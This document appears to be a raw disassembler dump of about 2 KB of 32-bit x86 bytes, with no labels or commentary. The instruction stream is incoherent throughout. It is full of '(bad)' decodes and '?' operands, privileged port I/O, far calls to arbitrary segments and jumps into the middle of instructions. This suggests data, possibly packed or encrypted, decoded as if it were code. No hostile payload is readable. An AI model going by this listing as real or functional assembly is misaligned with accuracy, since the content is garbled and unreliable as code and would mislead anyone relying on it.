  4030ca:	test   DWORD PTR [ebx+ebx*2],edx
  4030cd:	icebp  
  4030ce:	aas    
  4030cf:	sti    
  4030d0:	test   eax,0xb1ba3561
  4030d5:	loopne 0x4030ec
  4030d7:	inc    edx
  4030d8:	xor    DWORD PTR [ebp+0x6e96e062],ebx
  4030de:	pop    ebx
  4030df:	fdivr  QWORD PTR [eax]
  4030e1:	out    0xe9,al
  4030e3:	mov    ch,ah
  4030e5:	loopne 0x403103
  4030e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030e8:	jecxz  0x40310f
  4030ea:	inc    ecx
  4030eb:	(bad)  
  4030ec:	jg     0x40313c
  4030ee:	pop    es
  4030ef:	xchg   ecx,eax
  4030f0:	les    edi,FWORD PTR [edx]
  4030f2:	sbb    DWORD PTR [edx],eax
  4030f4:	pop    es
  4030f5:	add    ebp,DWORD PTR [ecx+0x49]
  4030f8:	outs   dx,DWORD PTR ds:[esi]
  4030f9:	adc    esp,DWORD PTR [edx+esi*4]
  4030fc:	dec    eax
  4030fd:	pushf  
  4030fe:	add    DWORD PTR fs:[ebp-0x38],0x687c20cf
  403106:	dec    edx
  403107:	test   eax,0xedbd44ec
  40310c:	test   al,0xad
  40310e:	loopne 0x40310f
  403110:	int3   
  403111:	jns    0x403101
  403113:	sbb    DWORD PTR [edi+0x2ce90e1f],esi
  403119:	pop    ebx
  40311a:	test   eax,0xc0dd0787
  40311f:	push   ss
  403120:	in     eax,0xb1
  403122:	sub    ecx,DWORD PTR [ebp+0xb22b4a1]
  403128:	xchg   ebx,eax
  403129:	hlt    
  40312a:	add    bh,BYTE PTR [ecx-0x1d]
  40312d:	mov    edx,0x4838e898
  403132:	std    
  403133:	sbb    eax,esi
  403135:	jb     0x4030ea
  403137:	aad    0x3d
  403139:	imul   ebx,DWORD PTR [ebx],0xa3efac15
  40313f:	aad    0xec
  403141:	dec    ecx
  403142:	test   eax,0x3654b9dd
  403147:	mov    bl,0x80
  403149:	test   al,0x87
  40314b:	adc    al,0xa8
  40314d:	call   0xa7ae:0xea905e8f
  403154:	push   ds
  403155:	sbb    BYTE PTR [edi+0x77139946],cl
  40315b:	dec    edx
  40315c:	push   ds
  40315d:	ret    
  40315e:	andnps xmm7,XMMWORD PTR [edx-0x5f162586]
  403165:	push   ebp
  403166:	or     DWORD PTR [ebx],ebp
  403168:	push   0x14
  40316a:	mov    edx,0xf47bcb2e
  40316f:	xor    edi,ecx
  403171:	jmp    0x403527
  403176:	data16 aas 
  403178:	in     eax,dx
  403179:	int3   
  40317a:	jne    0x403166
  40317c:	popa   
  40317d:	jno    0x4031dd
  40317f:	imul   esp,DWORD PTR [ebx],0x83291287
  403185:	xchg   edi,eax
  403186:	ds adc eax,0x7d977070
  40318c:	jo     0x4031fe
  40318e:	fst    QWORD PTR [ebp-0x22]
  403191:	ja     0x403207
  403193:	mov    dl,0x45
  403195:	enter  0x4287,0x15
  403199:	ret    0xd262
  40319c:	jne    0x403164
  40319e:	cmp    dh,BYTE PTR es:[ecx-0x1f7f1d71]
  4031a5:	inc    ecx
  4031a6:	js     0x4031d0
  4031a8:	push   ebx
  4031a9:	cs push ss
  4031ab:	dec    ecx
  4031ac:	sbb    esp,DWORD PTR [edi]
  4031ae:	aas    
  4031af:	inc    eax
  4031b0:	cdq    
  4031b1:	test   eax,0xcd109f8d
  4031b6:	or     BYTE PTR [edi+ebp*8+0x4473f195],cl
  4031bd:	jmp    0x5f0e8737
  4031c2:	leave  
  4031c3:	push   0xb17d42b1
  4031c8:	push   ebx
  4031c9:	mov    al,BYTE PTR [edx-0x467308f1]
  4031cf:	enter  0xb9aa,0x73
  4031d3:	sbb    esi,ebp
  4031d5:	cmp    esp,DWORD PTR [ebx-0x20]
  4031d8:	sar    DWORD PTR [ebx-0x1dd4090b],cl
  4031de:	fiadd  WORD PTR [edi]
  4031e0:	and    eax,0x1c2c4942
  4031e5:	adc    ebp,DWORD PTR [ebx]
  4031e7:	loope  0x4031ec
  4031e9:	rol    DWORD PTR [esi-0x45],0x43
  4031ed:	dec    ebp
  4031ee:	jle    0x4031ed
  4031f0:	cwde   
  4031f1:	not    BYTE PTR [edx+ebx*4+0x76]
  4031f5:	jno    0x403275
  4031f7:	mov    esi,0x31a8a8b7
  4031fc:	int    0xa6
  4031fe:	push   ss
  4031ff:	inc    ebx
  403200:	sti    
  403201:	sub    ebp,DWORD PTR [edx]
  403203:	or     ah,BYTE PTR [ebp-0x6f]
  403206:	bound  esi,QWORD PTR es:[ecx+0x3ef31455]
  40320d:	xlat   BYTE PTR ds:[bx]
  40320f:	xchg   esi,eax
  403210:	xchg   esi,edx
  403212:	arpl   WORD PTR [ebx+0x42935280],bp
  403218:	inc    ecx
  403219:	js     0x403207
  40321b:	xor    al,0xc
  40321d:	or     BYTE PTR [ecx+0x53],cl
  403220:	mov    esi,0x3bca7c75
  403225:	push   ecx
  403226:	loop   0x403249
  403228:	leave  
  403229:	xchg   ecx,eax
  40322a:	in     al,dx
  40322b:	jmp    0x59f3:0x30e9c2a4
  403232:	cmp    al,0xaf
  403234:	ret    0x2227
  403237:	cdq    
  403238:	jl     0x403237
  40323a:	mov    bh,0x42
  40323c:	dec    ecx
  40323d:	mov    ds:0xf50e90fb,al
  403242:	jo     0x403204
  403244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403245:	loopne 0x40325f
  403247:	out    dx,eax
  403248:	adc    al,0xcd
  40324a:	call   0x71acd845
  40324f:	xor    dh,0x6
  403252:	jecxz  0x4031d9
  403254:	push   ebp
  403255:	jecxz  0x403298
  403257:	call   0x6c2f4b
  40325c:	jb     0x4032b8
  40325e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40325f:	xchg   ebx,eax
  403260:	jecxz  0x40323e
  403262:	rcr    BYTE PTR [esi],cl
  403264:	mov    edi,0x504df76a
  403269:	dec    eax
  40326a:	push   ss
  40326b:	xor    edx,DWORD PTR [edx+0x19e4dba9]
  403271:	rol    edi,cl
  403273:	in     al,dx
  403274:	outs   dx,BYTE PTR ds:[esi]
  403275:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  403277:	and    edi,DWORD PTR [ebx+0x7f]
  40327a:	sub    eax,0x71bea7dd
  40327f:	pop    esp
  403280:	cdq    
  403281:	in     eax,dx
  403282:	xchg   esp,eax
  403283:	sbb    esi,DWORD PTR ds:0xb96a5dea
  403289:	repnz inc eax
  40328b:	test   al,0xb
  40328d:	pop    esi
  40328e:	jne    0x403273
  403290:	mov    ds:0xc6a9fa31,al
  403295:	sub    DWORD PTR [esi],esi
  403297:	jl     0x403297
  403299:	div    DWORD PTR [eax]
  40329b:	rol    DWORD PTR [eax],cl
  40329d:	push   ecx
  40329e:	mov    ch,0xc4
  4032a0:	or     edi,DWORD PTR [ebx]
  4032a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032a3:	sbb    eax,0x6fa2210c
  4032a8:	or     eax,DWORD PTR [ecx-0x56f31603]
  4032ae:	mov    esi,0x245354f1
  4032b3:	fcomp  QWORD PTR [esi+0x588d50b6]
  4032b9:	mov    bl,0x18
  4032bb:	mov    ss,WORD PTR [ebp-0x3f]
  4032be:	push   ebx
  4032bf:	pop    ebp
  4032c0:	popa   
  4032c1:	pop    eax
  4032c2:	mov    BYTE PTR [esi-0x46e896d2],ah
  4032c8:	or     eax,0xf32a66e2
  4032cd:	fstp   QWORD PTR [eax-0x1a]
  4032d0:	or     BYTE PTR [ebx+0x6ecb6bc8],ah
  4032d6:	repz cld 
  4032d8:	push   ebx
  4032d9:	stc    
  4032da:	popa   
  4032db:	pop    edx
  4032dc:	mov    eax,0x862b8217
  4032e1:	pop    esp
  4032e2:	jmp    0x403297
  4032e4:	jb     0x40326d
  4032e6:	fild   QWORD PTR [ebx]
  4032e8:	sbb    DWORD PTR [eax],edx
  4032ea:	in     eax,dx
  4032eb:	test   al,0x5a
  4032ed:	push   esi
  4032ee:	(bad)  
  4032ef:	hlt    
  4032f0:	adc    edi,DWORD PTR [eax]
  4032f2:	jg     0x4032dc
  4032f4:	pop    es
  4032f5:	int    0x78
  4032f7:	sbb    cl,0xc9
  4032fa:	in     al,dx
  4032fb:	mov    cl,0x4f
  4032fd:	mov    edi,0x9090fbe8
  403302:	lds    edx,FWORD PTR [ecx-0x5]
  403305:	inc    ecx
  403306:	jge    0x4032d5
  403308:	add    BYTE PTR [eax+ebp*4-0x37c91520],ah
  40330f:	push   eax
  403310:	sub    ah,BYTE PTR [eax]
  403312:	(bad)  
  403313:	int    0x3d
  403315:	push   es
  403316:	xor    bh,BYTE PTR [ebx]
  403318:	inc    ecx
  403319:	inc    ebp
  40331a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40331b:	push   ds
  40331c:	jl     0x40336d
  40331e:	fcomip st,st(2)
  403320:	jne    0x40331c
  403322:	sbb    DWORD PTR [ebx],0xeee512ec
  403328:	xor    edx,DWORD PTR [ebp-0x6c97627c]
  40332e:	icebp  
  40332f:	mov    cl,0x7a
  403331:	call   0x361c:0x32cdf1b5
  403338:	jb     0x4032fd
  40333a:	scas   al,BYTE PTR es:[edi]
  40333b:	cdq    
  40333c:	xchg   ebx,eax
  40333d:	sbb    eax,0x914a7ed8
  403342:	mov    ebp,0x93a34175
  403347:	lods   al,BYTE PTR ds:[esi]
  403348:	daa    
  403349:	push   0x78
  40334b:	pusha  
  40334c:	nop
  40334d:	ins    DWORD PTR es:[edi],dx
  40334e:	lds    ecx,FWORD PTR [edi-0x7bb3d10a]
  403354:	cmp    BYTE PTR [ebp+0x2ab6910d],0x61
  40335b:	in     al,0xa8
  40335d:	jl     0x40330c
  40335f:	cld    
  403360:	into   
  403361:	push   eax
  403362:	inc    edx
  403363:	sub    eax,0xfb801a02
  403368:	jp     0x40332a
  40336a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40336b:	loop   0x40339a
  40336d:	dec    ebp
  40336e:	sbb    BYTE PTR [ecx-0x31],bl
  403371:	ficomp DWORD PTR [ecx+0x809841d]
  403377:	ret    0xcaa7
  40337a:	adc    ebx,DWORD PTR [eax]
  40337c:	push   esi
  40337d:	mov    ds:0xd9f9e303,al
  403382:	imul   ebp,DWORD PTR [esi-0x3a9a4ccf],0x52
  403389:	aad    0x7b
  40338b:	jb     0x4033cf
  40338d:	pop    edx
  40338e:	xor    esi,DWORD PTR [esi]
  403390:	call   0xef25:0x9a211803
  403397:	inc    eax
  403398:	inc    ecx
  403399:	sbb    BYTE PTR [ebx+0x13],ah
  40339c:	xchg   ebx,eax
  40339d:	or     eax,eax
  40339f:	add    ecx,edi
  4033a1:	icebp  
  4033a2:	fimul  WORD PTR [edx-0x2e276273]
  4033a8:	in     eax,0xbf
  4033aa:	and    esi,DWORD PTR [edx]
  4033ac:	mov    esi,0x65474a2
  4033b1:	imul   edx,DWORD PTR [edi+0x4ebcb871],0xcc3c3925
  4033bb:	jo     0x403340
  4033bd:	aam    0xb5
  4033bf:	lea    ebp,[esi-0x1d]
  4033c2:	fcom   QWORD PTR [edx+0x346504d7]
  4033c8:	pop    ebx
  4033c9:	(bad)  
  4033ca:	ror    dh,cl
  4033cc:	jne    0x4033e4
  4033ce:	stos   BYTE PTR es:[edi],al
  4033cf:	sti    
  4033d0:	ret    
  4033d1:	(bad)  
  4033d2:	sbb    eax,0xf99c5a02
  4033d7:	cmp    eax,0x26aef1fc
  4033dc:	repz cmp al,0x33
  4033df:	cli    
  4033e0:	aam    0xda
  4033e2:	nop
  4033e3:	cmp    eax,DWORD PTR [ecx+0x37]
  4033e6:	inc    ebx
  4033e7:	mov    al,0x69
  4033e9:	xchg   edi,eax
  4033ea:	inc    edx
  4033eb:	sti    
  4033ec:	pop    esp
  4033ed:	(bad)
  4033f0:	inc    esi
  4033f1:	mov    bl,0x9c
  4033f3:	xor    eax,edi
  4033f5:	pop    ss
  4033f6:	loope  0x4033da
  4033f8:	xor    BYTE PTR [edx],0x36
  4033fb:	inc    eax
  4033fc:	xor    ecx,ebx
  4033fe:	rol    DWORD PTR [ebx+0x1c660475],1
  403404:	inc    ebx
  403405:	and    ecx,DWORD PTR [edi]
  403407:	leave  
  403408:	outs   dx,DWORD PTR ds:[esi]
  403409:	mov    ebx,0x164e0e2f
  40340e:	std    
  40340f:	nop
  403410:	mov    edi,0xc58e4355
  403415:	jnp    0x40348d
  403417:	retf   0x59b
  40341a:	outs   dx,BYTE PTR ds:[esi]
  40341b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40341c:	std    
  40341d:	sbb    bh,BYTE PTR [ebp+0x7e]
  403420:	xchg   DWORD PTR [eax],ebp
  403422:	or     eax,0x169a4ede
  403427:	popa   
  403428:	loop   0x40343c
  40342a:	inc    esp
  40342b:	xchg   edx,eax
  40342c:	add    edi,esi
  40342e:	idiv   DWORD PTR [ecx]
  403430:	adc    ch,bh
  403432:	mov    ebx,0xca63f2f8
  403437:	jmp    0x2af3:0x5fd4844d
  40343e:	mov    al,ds:0x96254f73
  403443:	jecxz  0x403435
  403445:	test   esi,eax
  403447:	iret   
  403448:	loope  0x40347a
  40344a:	stos   DWORD PTR es:[edi],eax
  40344b:	or     BYTE PTR [edi+0x7dc18c84],bl
  403451:	inc    ecx
  403452:	xchg   edi,eax
  403453:	cvtps2pd xmm3,QWORD PTR [ebp-0x48fb7938]
  40345a:	test   al,0x3f
  40345c:	push   cs
  40345d:	sbb    DWORD PTR [ecx-0x5a161016],0x90e6bfe6
  403467:	fidiv  DWORD PTR [edi+ecx*4+0x75cabcd1]
  40346f:	mov    ds:0x2fc055a0,eax
  403474:	xchg   ebp,eax
  403475:	push   ebp
  403476:	(bad)  
  403477:	or     eax,0x3e299e18
  40347c:	pop    es
  40347d:	mov    ebp,esi
  40347f:	into   
  403480:	sbb    dl,BYTE PTR [edi+0x13]
  403483:	ret    
  403484:	dec    esi
  403485:	push   edi
  403486:	pop    esi
  403487:	out    dx,eax
  403488:	push   ds
  403489:	call   DWORD PTR [ebx-0x3]
  40348c:	test   al,0x6c
  40348e:	in     al,0x67
  403490:	std    
  403491:	fidiv  DWORD PTR es:0x274fe4f8
  403498:	pop    ebp
  403499:	push   esp
  40349a:	out    0x45,al
  40349c:	neg    DWORD PTR [ebx+0x69]
  40349f:	lds    edx,FWORD PTR ds:0x4b2dd11
  4034a5:	xlat   BYTE PTR ds:[ebx]
  4034a6:	xchg   esp,eax
  4034a7:	xchg   ecx,eax
  4034a8:	inc    edx
  4034a9:	das    
  4034aa:	jbe    0x403444
  4034ac:	sbb    BYTE PTR [ecx+0x3],ch
  4034af:	jp     0x4034ab
  4034b1:	mov    ah,0xb1
  4034b3:	mov    ?,WORD PTR [esi+0x3b0326e7]
  4034b9:	iret   
  4034ba:	dec    ecx
  4034bb:	ret    
  4034bc:	pop    edx
  4034bd:	sub    DWORD PTR [ecx+eax*1],edx
  4034c0:	call   0xe897:0xeb3a2307
  4034c7:	stos   BYTE PTR es:[edi],al
  4034c8:	nop
  4034c9:	sbb    esi,ecx
  4034cb:	js     0x4034f9
  4034cd:	and    DWORD PTR [edi],ebx
  4034cf:	cwde   
  4034d0:	mov    ebx,esi
  4034d2:	iret   
  4034d3:	xor    al,0xfa
  4034d5:	pop    eax
  4034d6:	xor    al,0xca
  4034d8:	add    al,0x98
  4034da:	inc    edx
  4034db:	aad    0x5f
  4034dd:	jb     0x4034de
  4034df:	jl     0x4034b7
  4034e1:	jl     0x4034d4
  4034e3:	push   eax
  4034e4:	xor    ch,ch
  4034e6:	push   esi
  4034e7:	xchg   edi,eax
  4034e8:	fs stos BYTE PTR es:[edi],al
  4034ea:	fstp   QWORD PTR [ebx]
  4034ec:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4034ee:	cld    
  4034ef:	adc    DWORD PTR [esp+eax*1],ecx
  4034f2:	push   eax
  4034f3:	or     eax,edx
  4034f5:	xchg   edx,eax
  4034f6:	add    edx,ecx
  4034f8:	sahf   
  4034f9:	mov    ecx,0x43f20ba4
  4034fe:	frstor [esi+0x18]
  403501:	mov    bh,0x9b
  403503:	pusha  
  403504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403505:	push   cs
  403506:	out    0xe1,eax
  403508:	mov    ds:0xf25cf65a,al
  40350d:	cmp    eax,0x69c75e5a
  403512:	and    eax,0xf4b2f29d
  403517:	out    0x1e,al
  403519:	stos   BYTE PTR es:[edi],al
  40351a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40351b:	push   0x50
  40351d:	add    eax,DWORD PTR [ecx+0x74]
  403520:	dec    ecx
  403521:	jb     0x40354b
  403523:	pop    ebx
  403524:	nop
  403525:	mov    bl,0x49
  403527:	add    edi,esi
  403529:	mov    esi,DWORD PTR [ebp+0x8]
  40352c:	imul   edi,edx
  40352f:	mov    ebx,DWORD PTR [ebp+0xc]
  403532:	jmp    0x4038e8
  403537:	jle    0x4034ce
  403539:	mov    esi,0x45d75507
  40353e:	xchg   ebp,eax
  40353f:	icebp  
  403540:	repz cs jle 0x403552
  403544:	push   ss
  403545:	or     eax,0x70125558
  40354a:	jo     0x4034e3
  40354c:	jge    0x4035be
  40354e:	jo     0x4034e2
  403550:	mov    DWORD PTR [esi+0x26],ebp
  403553:	mov    edi,0xb3ddaa2e
  403558:	mov    bl,0xa2
  40355a:	xchg   esi,eax
  40355b:	sbb    dh,BYTE PTR es:[bx+di]
  40355f:	mov    ds:0xc5351079,al
  403564:	out    dx,eax
  403565:	sbb    eax,0x10fecd1
  40356a:	test   DWORD PTR [eax+0x6a5e4331],edi
  403570:	cmp    ch,BYTE PTR [eax]
  403572:	leave  
  403573:	aaa    
  403574:	inc    ecx
  403575:	add    BYTE PTR [edi],dl
  403577:	fdiv   DWORD PTR [ebp-0x14]
  40357a:	outs   dx,BYTE PTR ds:[esi]
  40357b:	push   ecx
  40357c:	pop    ecx
  40357d:	pop    ss
  40357e:	aaa    
  40357f:	add    bh,cl
  403581:	call   0xf458:0xf18261c6
  403588:	push   0x10293f63
  40358d:	fadd   QWORD PTR [eax+eiz*2-0x34]
  403591:	lds    esp,FWORD PTR [eax-0x79d0b601]
  403597:	push   0xffffffc7
  403599:	sti    
  40359a:	mov    ch,al
  40359c:	lods   eax,DWORD PTR ds:[esi]
  40359d:	fucomip st,st(3)
  40359f:	push   ss
  4035a0:	add    al,0x97
  4035a2:	stos   BYTE PTR es:[edi],al
  4035a3:	xor    al,0x6f
  4035a5:	leave  
  4035a6:	mov    al,ds:0x6bf9df63
  4035ab:	lods   al,BYTE PTR ds:[esi]
  4035ac:	push   esi
  4035ad:	aaa    
  4035ae:	xor    eax,DWORD PTR es:[ebx+0x145e6f80]
  4035b5:	dec    esp
  4035b6:	bound  edx,QWORD PTR [ebp+ebx*1-0x50]
  4035ba:	adc    esi,DWORD PTR [edi-0x5b]
  4035bd:	das    
  4035be:	icebp  
  4035bf:	ror    DWORD PTR [ebx],cl
  4035c1:	std    
  4035c2:	(bad)
  4035c7:	pop    esi
  4035c8:	cli    
  4035c9:	pop    ecx
  4035ca:	or     eax,0x77c1e78c
  4035cf:	or     dh,dh
  4035d1:	dec    esi
  4035d2:	mov    al,ds:0x2a5f6328
  4035d7:	mov    ds:0xe956ab48,eax
  4035dc:	sub    BYTE PTR [edi-0x3e],dl
  4035df:	mov    dl,bl
  4035e1:	sub    bl,BYTE PTR [ebx]
  4035e3:	aaa    
  4035e4:	rcr    BYTE PTR [edi+0x6d0dd520],1
  4035ea:	int    0xdd
  4035ec:	mov    eax,0xe4240a9
  4035f1:	sbb    eax,0xc3be4a6c
  4035f6:	xor    BYTE PTR ds:0xb2fd49b8,dh
  4035fc:	mov    eax,0x6eb52e81
  403601:	in     eax,dx
  403602:	or     DWORD PTR [ecx-0x1f80a473],eax
  403608:	jmp    0x559ee892
  40360d:	js     0x40363e
  40360f:	repz sub bl,al
  403612:	ins    BYTE PTR es:[edi],dx
  403613:	je     0x403616
  403615:	inc    ecx
  403616:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403617:	stos   DWORD PTR es:[edi],eax
  403618:	sti    
  403619:	xor    DWORD PTR [edi],0xbe51d2c8
  40361f:	mov    DWORD PTR [edi-0x5f],edx
  403622:	lea    edx,[esi-0x581ee416]
  403628:	mov    DWORD PTR [ebx+0x19],0xaacb3d7d
  40362f:	push   cs
  403630:	leave  
  403631:	lds    eax,FWORD PTR [ebp+0x32]
  403634:	pop    ecx
  403635:	dec    ebx
  403636:	repz daa 
  403638:	mov    edi,0xd6541d60
  40363d:	push   ds
  40363e:	or     esi,DWORD PTR [ebp+0x63248541]
  403644:	sbb    bh,dh
  403646:	mov    eax,0x6e51f5f6
  40364b:	icebp  
  40364c:	enter  0xb581,0xe0
  403650:	cmp    ebp,DWORD PTR [ecx-0x8b81684]
  403656:	xchg   DWORD PTR [edx+0xac8e92f],ecx
  40365c:	cmp    ebp,DWORD PTR ds:0xa0f9299
  403662:	xchg   edi,eax
  403663:	push   ebp
  403664:	lahf   
  403665:	and    eax,DWORD PTR [esp+eax*4+0x25]
  403669:	cmp    BYTE PTR [eax+0x6c],ch
  40366c:	jne    0x4036b9
  40366e:	jecxz  0x4036a2
  403670:	and    BYTE PTR [esi-0x48fe1bd4],bh
  403676:	mov    edi,0x4e6f15f5
  40367b:	cmp    edi,DWORD PTR [esi+0x2ecdc8e0]
  403681:	push   ecx
  403682:	(bad)
  403686:	(bad)
  40368a:	rol    DWORD PTR [esp+ebx*8],cl
  40368d:	mov    esp,eax
  40368f:	mov    ebx,DWORD PTR [ecx+0x32]
  403692:	inc    esi
  403693:	mov    ebp,0x7532668f
  403698:	cli    
  403699:	inc    ebx
  40369a:	mov    al,al
  40369c:	adc    eax,0x63c07e7e
  4036a1:	(bad)  
  4036a2:	xchg   edx,eax
  4036a3:	mov    bl,0x32
  4036a5:	fcomp  QWORD PTR [ebx]
  4036a7:	xor    eax,0x37d97f6f
  4036ac:	test   BYTE PTR [eax-0x6cc265f1],ah
  4036b2:	scas   eax,DWORD PTR es:[edi]
  4036b3:	stos   DWORD PTR es:[edi],eax
  4036b4:	sbb    edx,edx
  4036b6:	xchg   edi,eax
  4036b7:	test   eax,0x14549381
  4036bc:	pop    ebx
  4036bd:	mov    esi,?
  4036bf:	out    dx,al
  4036c0:	xchg   edx,eax
  4036c1:	adc    esp,eax
  4036c3:	xor    edx,DWORD PTR [ebp+0x30]
  4036c6:	jecxz  0x403735
  4036c8:	test   DWORD PTR [esi+0x639c8cb8],ebp
  4036ce:	add    DWORD PTR fs:[ebp+0x9],ebp
  4036d2:	imul   ecx,edx,0xa3ed8872
  4036d8:	adc    BYTE PTR [edi+0x75],0x97
  4036dc:	shl    DWORD PTR [ebp-0x3c9543ad],cl
  4036e2:	mov    dl,0x7d
  4036e4:	jno    0x4036f7
  4036e6:	pop    esp
  4036e7:	aaa    
  4036e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036e9:	es push ebp
  4036eb:	stos   BYTE PTR es:[edi],al
  4036ec:	outs   dx,DWORD PTR ds:[esi]
  4036ed:	mov    ah,0x3c
  4036ef:	stos   DWORD PTR es:[edi],eax
  4036f0:	pop    edi
  4036f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036f2:	mov    fs,edx
  4036f4:	xor    DWORD PTR [ecx-0x74],esi
  4036f7:	add    DWORD PTR [eax],0x4ee919f1
  4036fd:	fdivr  DWORD PTR [eax-0x34]
  403700:	push   ds
  403701:	imul   esp,DWORD PTR gs:[ecx+0x7f],0x389fddd9
  403709:	ins    BYTE PTR es:[edi],dx
  40370a:	(bad)  
  40370c:	mov    DWORD PTR [edx-0x50],ebx
  40370f:	fdivr  st(1),st
  403711:	inc    ecx
  403712:	jecxz  0x4036d0
  403714:	dec    esp
  403715:	or     esi,ebx
  403717:	mov    dl,0x47
  403719:	inc    esi
  40371a:	jp     0x403742
  40371c:	push   esi
  40371d:	push   ebp
  40371e:	imul   esi,DWORD PTR [esi-0x37c01fee],0xaa9b18b
  403728:	mov    ax,0x87a9
  40372c:	int3   
  40372d:	dec    ecx
  40372e:	mov    ds:0x37d9ae5,eax
  403733:	mov    esp,es
  403735:	outs   dx,BYTE PTR ds:[esi]
  403736:	shr    bl,1
  403738:	push   ds
  403739:	fwait
  40373a:	retf   0x8699
  40373d:	repnz cmc 
  40373f:	mov    WORD PTR ds:0xa5586979,gs
  403745:	jg     0x403751
  403747:	cmc    
  403748:	sub    cl,0xdf
  40374b:	out    dx,eax
  40374c:	xor    BYTE PTR [esi-0x577ee331],dh
  403752:	xchg   edx,eax
  403753:	add    eax,0x54b1c719
  403758:	dec    ecx
  403759:	retf   0xa220
  40375c:	add    esi,DWORD PTR [esi+eiz*1]
  40375f:	mov    DWORD PTR [ebx],esp
  403761:	test   al,0xbc
  403763:	das    
  403764:	pop    ecx
  403765:	data16 fild DWORD PTR [ebx-0x7b5df021]
  40376c:	sub    edx,eax
  40376e:	das    
  40376f:	and    BYTE PTR [bp+di+0x37],cl
  403773:	aad    0xd9
  403775:	xlat   BYTE PTR ds:[ebx]
  403776:	arpl   WORD PTR [ebx],cx
  403778:	add    esi,DWORD PTR [edi-0x49fb2d45]
  40377e:	aaa    
  40377f:	xor    al,0x69
  403781:	mov    ebx,DWORD PTR [ebx]
  403783:	xchg   ecx,eax
  403784:	scas   al,BYTE PTR es:[edi]
  403785:	add    bl,BYTE PTR [eax+0x76f1bc54]
  40378b:	add    BYTE PTR [ebx-0x55],bl
  40378e:	sbb    eax,0xa25c2537
  403793:	add    dh,dl
  403795:	imul   ecx
  403797:	cmp    ecx,esp
  403799:	enter  0x1b32,0x21
  40379d:	mov    esp,0xeac543c5
  4037a2:	or     eax,0xffffffaa
  4037a5:	stc    
  4037a6:	pop    edi
  4037a7:	push   cs
  4037a8:	push   ebx
  4037a9:	mov    eax,0x2779d6eb
  4037ae:	fcom   QWORD PTR [ebp+0x9]
  4037b1:	mov    esp,0x661622c4
  4037b6:	lahf   
  4037b7:	adc    BYTE PTR [ebx*1+0x54d249c9],dl
  4037be:	mov    edx,0xc7c97e0c
  4037c3:	rcl    dh,1
  4037c5:	pop    ss
  4037c6:	sbb    DWORD PTR [eax+0x5c],esp
  4037c9:	mov    dh,0xce
  4037cb:	pop    ecx
  4037cc:	jbe    0x403780
  4037ce:	idiv   DWORD PTR [ebp+0x701b361f]
  4037d4:	xlat   BYTE PTR ds:[ebx]
  4037d5:	xchg   ebp,eax
  4037d6:	leave  
  4037d7:	mov    bh,0x1c
  4037d9:	jl     0x403780
  4037db:	pop    es
  4037dc:	jmp    0x1c0f074e
  4037e1:	cdq    
  4037e2:	(bad)  
  4037e3:	sti    
  4037e4:	pop    esp
  4037e5:	int    0xed
  4037e7:	(bad)  
  4037e8:	mov    cl,BYTE PTR [edi+0x3]
  4037eb:	xchg   edx,eax
  4037ec:	pop    edx
  4037ed:	test   DWORD PTR cs:[edi],esp
  4037f0:	push   eax
  4037f1:	jbe    0x4037ec
  4037f3:	inc    ebp
  4037f4:	push   0x17
  4037f6:	jo     0x4037e2
  4037f8:	icebp  
  4037f9:	gs push esp
  4037fb:	or     DWORD PTR ds:0x13902d6b,eax
  403801:	push   esi
  403802:	std    
  403803:	xchg   esp,eax
  403804:	push   ss
  403805:	mov    edx,0x39ac312f
  40380a:	out    dx,eax
  40380b:	stos   DWORD PTR es:[edi],eax
  40380c:	ror    BYTE PTR [eax],cl
  40380e:	repz push ds
  403810:	xchg   edx,eax
  403811:	mov    eax,0xe3a3fc3
  403816:	adc    DWORD PTR [ecx+0x1fcf2b75],edi
  40381c:	dec    ecx
  40381d:	lock jae 0x4037a0
  403820:	push   0xfffffff2
  403822:	stos   DWORD PTR es:[edi],eax
  403823:	mov    fs,WORD PTR [esi-0x9]
  403826:	push   esi
  403827:	xor    eax,0x5eb65428
  40382c:	dec    ecx
  40382d:	repnz mov al,ds:0xdb2d4859
  403833:	gs add eax,0x18b030ee
  403839:	push   es
  40383a:	dec    esp
  40383b:	loope  0x403838
  40383d:	xor    eax,0x2dea765a
  403842:	pop    ebp
  403843:	(bad)  
  403845:	cmp    BYTE PTR [edx+0x7f],dh
  403848:	cdq    
  403849:	nop
  40384a:	or     BYTE PTR ds:[edx-0x1478b861],0xf
  403852:	xchg   DWORD PTR [ecx-0x4d78b04c],edx
  403858:	sbb    DWORD PTR [edi-0x52],esi
  40385b:	sbb    eax,0xa4097e1a
  403860:	(bad)  
  403861:	std    
  403862:	fdivr  st,st(4)
  403864:	and    BYTE PTR [edx-0x52],al
  403867:	sub    DWORD PTR [edx-0x1b],edx
  40386a:	jmp    0x49861123
  40386f:	add    esp,ebp
  403871:	jb     0x4038cb
  403873:	xor    ch,cl
  403875:	and    eax,0x72be0e1d
  40387a:	mov    edx,0x9fc69d89
  40387f:	xlat   BYTE PTR ds:[ebx]
  403880:	loopne 0x4038a1
  403882:	sub    ebp,DWORD PTR [ebx]
  403884:	add    eax,0x7c6c6edc
  403889:	in     eax,0x9a
  40388b:	push   eax
  40388c:	mov    ebx,0x718db0b2
  403891:	mov    al,ds:0xda556929
  403896:	adc    al,0x32
  403898:	and    edi,ebx
  40389a:	test   BYTE PTR [edi+0x5370cbda],cl
  4038a0:	or     eax,0xfaf2c3b6
  4038a5:	loop   0x403862
  4038a7:	call   DWORD PTR [edi+0x48]
  4038aa:	shr    esi,1
  4038ac:	fcomp  DWORD PTR [edi+eiz*4+0x6c9f9b93]
  4038b3:	xchg   edx,eax
  4038b4:	sar    DWORD PTR [ebp-0x59],1
  4038b7:	jl     0x4038ca
  4038b9:	push   ds
  4038ba:	mov    bl,0x44
  4038bc:	push   edx
